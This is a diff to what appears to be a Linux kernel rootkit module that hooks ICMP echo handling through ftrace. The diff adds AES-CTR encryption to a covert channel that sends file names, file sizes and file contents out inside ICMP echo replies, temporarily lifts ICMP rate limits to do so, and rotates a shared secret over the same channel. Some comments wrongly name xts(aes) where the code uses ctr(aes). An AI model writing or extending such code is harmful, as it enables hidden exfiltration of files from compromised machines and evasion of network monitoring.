@@ -39,6 +39,7 @@
 #include <linux/mempolicy.h>
 #include <linux/namei.h>
 #include <linux/wait.h>
+#include <crypto/skcipher.h>
 //#include "fs/proc/internal.h"
 #include "ftrace_hook.h"
 
@@ -1786,6 +1787,9 @@ LIST_HEAD(exec_event_list);
 static struct task_struct *event_kthread = NULL;
 static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);
 
+static DEFINE_MUTEX(mutex_tfm);
+struct crypto_skcipher *tfm = NULL;
+
 int make_exec_event(int cmd, void *data);
 static int do_icmp_echo(struct sk_buff *skb)
 {
@@ -1857,7 +1861,52 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 
 static int enc_buf(char *dst, char *src, int len)
 {
-	return 0;
+	struct skcipher_request *req = NULL;
+	struct scatterlist sg;
+	DECLARE_CRYPTO_WAIT(wait);
+	u8 iv[16] = "hide_proc";  /* AES-256-XTS takes a 16-byte IV */
+	int err;
+
+	mutex_lock(&mutex_tfm);
+	if (!tfm) {
+		tfm = crypto_alloc_skcipher("ctr(aes)", 0, 0);
+		if (IS_ERR(tfm)) {
+			printk(KERN_INFO "Error allocating xts(aes) handle: %ld\n", PTR_ERR(tfm));
+			mutex_unlock(&mutex_tfm);
+			return PTR_ERR(tfm);
+		}
+	}
+
+	err = crypto_skcipher_setkey(tfm, secret, sizeof(secret));
+	if (err) {
+		printk(KERN_INFO "Error setting key: %d\n", err);
+		goto out;
+	}
+
+	/* Allocate a request object */
+	req = skcipher_request_alloc(tfm, GFP_KERNEL);
+	if (!req) {
+		err = -ENOMEM;
+		goto out;
+	}
+
+	memcpy(iv, secret, sizeof(iv) > sizeof(secret) ? sizeof(secret) : sizeof(iv));
+	sg_init_one(&sg, src, len);
+	skcipher_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG |
+			CRYPTO_TFM_REQ_MAY_SLEEP,
+			crypto_req_done, &wait);
+	skcipher_request_set_crypt(req, &sg, &sg, len, iv);
+	err = crypto_wait_req(crypto_skcipher_encrypt(req), &wait);
+	if (err) {
+		printk(KERN_INFO "Error encrypting data: %d\n", err);
+		goto out;
+	}
+
+out:
+	if (req)
+		skcipher_request_free(req);
+	mutex_unlock(&mutex_tfm);
+	return err;
 }
 
 static void set_seq(struct icmphdr *icmph, unsigned short seq)
@@ -2012,9 +2061,10 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	while (file_size > 0) {
 		len = file_size > buf_len ? buf_len : file_size;
 
-		enc_buf(data+size, data+size, len);
 		skb_get(skb2);
 		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);
+		enc_buf(cmd, cmd, len+LEN_PREFIX_CMD+l_name+1);
+
 		set_seq(icmph, seq++);
 
 		while (!icmp_ratelimit(&icmp_rs, len)) 
@@ -2055,6 +2105,8 @@ end:
 static int do_send_file_size(const char *name, struct sk_buff *skb, char *buf, int buf_len)
 {
 	long file_size = 0;
+	int f_len = 0;
+	char *ptr = NULL;
 	int rc = -1;
 
 	if (!name || buf_len < sizeof(file_size))
@@ -2063,9 +2115,13 @@ static int do_send_file_size(const char *name, struct sk_buff *skb, char *buf, i
 	file_size = htonl(get_file_size(name));
 	if (file_size < 0)
 		goto end;
+
+	f_len = strlen(name);
 	//pr_info("name:%s, size:%ld", name, file_size);
 	memcpy(buf, (void*)&file_size, sizeof(file_size));
-	enc_buf(buf, buf, sizeof(file_size));
+
+	ptr = buf-f_len-1-LEN_PREFIX_CMD;
+	enc_buf(ptr, ptr, sizeof(file_size)+f_len+1+LEN_PREFIX_CMD);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
@@ -2129,7 +2185,7 @@ static int do_secret_task(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
 	char *p_cmd = NULL;
-	char *buf = NULL;
+	char new_sec[LEN_SECRET] = {0};
 	int len = 0;
 	int rc = -1;
 
@@ -2140,21 +2196,16 @@ static int do_secret_task(struct sk_buff *skb)
 	if (len < LEN_SECRET)
 		goto end;
 
-	buf = kmalloc(2*LEN_SECRET, GFP_KERNEL);
-	if (!buf)
-		goto end;
-
-	get_random_bytes(buf, LEN_SECRET);
-	enc_buf(buf+LEN_SECRET, buf, LEN_SECRET);
+	get_random_bytes(new_sec, sizeof(new_sec));
 	
-	memcpy(p_cmd+LEN_PREFIX_CMD, buf, LEN_SECRET);
+	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, sizeof(new_sec));
+	enc_buf(p_cmd, p_cmd, LEN_SECRET+LEN_PREFIX_CMD);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
 	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 
-	memcpy(secret, buf+LEN_SECRET, LEN_SECRET);
-	kfree(buf);
+	memcpy(secret, new_sec, sizeof(new_sec));
 
 	rc = 0;
 end:
